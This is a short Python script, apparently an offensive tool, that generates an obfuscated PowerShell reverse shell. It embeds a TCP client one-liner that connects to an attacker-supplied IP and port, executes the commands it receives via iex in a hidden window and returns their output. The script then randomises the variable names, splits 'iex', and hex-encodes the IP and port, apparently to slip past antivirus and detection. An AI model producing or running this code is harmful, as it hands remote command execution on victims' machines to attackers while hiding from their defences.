import re
import string
import random

# Accept user input for IP and port
ip = input("Enter IP address: ")
port = input("Enter port: ")
script = "Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"

# Open script.ps1 file in read mode
#with open(file, 'r') as f:
#    script = f.read()

# Replace all variables with random 10-character names - excluding $PSHOME
var_dict = {}
pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9]+)')

def replace_var(match):
    var_name = match.group(1)
    if var_name not in var_dict:
        var_dict[var_name] = f'${"".join(random.choices(string.ascii_letters + string.digits, k=10))}'
    return var_dict[var_name]

script = pattern.sub(replace_var, script)

# Replace iex with i''ex
pattern = re.compile(r'iex')
script = pattern.sub("i''ex", script)

# Replace PS with <:Random uuid):>
pattern = re.compile(r'\bPS\b')

def replace_ps(match):
    return f'<:{"".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'

script = pattern.sub(replace_ps, script)

# Replace IP and port in script
script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")

# Convert IP addresses to hex
pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

def ip_to_hex(match):
    return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))

script = pattern.sub(ip_to_hex, script)

# Convert Port Number to hex - Not matching 65535
pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')

def port_to_hex(match):
        port_number = int(match.group())
        hex_value = hex(port_number)
        return hex_value

script = pattern.sub(port_to_hex, script)

# Print modified script to console
print(script)
